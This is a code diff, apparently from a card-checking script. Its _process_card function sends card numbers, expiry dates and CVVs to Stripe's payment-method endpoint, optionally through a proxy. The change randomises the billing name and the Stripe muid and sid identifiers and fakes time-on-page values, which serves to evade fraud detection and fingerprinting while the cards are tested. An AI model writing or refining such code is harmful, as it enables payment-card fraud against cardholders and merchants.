@@ -224,14 +224,15 @@ def _process_card(cc, mm, yy, cvv, proxy_dict=None):
             'user-agent': ULTRA_HEADERS['user-agent'],
         }
 
+        rand_name = ''.join(random.choice(string.ascii_uppercase) + ''.join(random.choices(string.ascii_lowercase, k=random.randint(3,7))) for _ in range(2))
         stripe_payload = (
             f'type=card&card[number]={cc}&card[cvc]={cvv}'
             f'&card[exp_year]={yy_full}&card[exp_month]={mm}'
-            f'&billing_details[name]={acc["name"].replace(" ", "+")}'
+            f'&billing_details[name]={rand_name.replace(" ", "+")}'
             f'&billing_details[address][postal_code]=10001'
             f'&key={pk_live}'
-            f'&muid={acc["cookies"].get("__stripe_mid", str(uuid.uuid4()))}'
-            f'&sid={acc["cookies"].get("__stripe_sid", str(uuid.uuid4()))}'
+            f'&muid={str(uuid.uuid4())}'
+            f'&sid={str(uuid.uuid4())}'
             f'&guid={str(uuid.uuid4())}'
             f'&payment_user_agent=stripe.js%2F8f77e26090%3B+stripe-js-v3%2F8f77e26090%3B+checkout'
             f'&time_on_page={random.randint(90000, 150000)}'
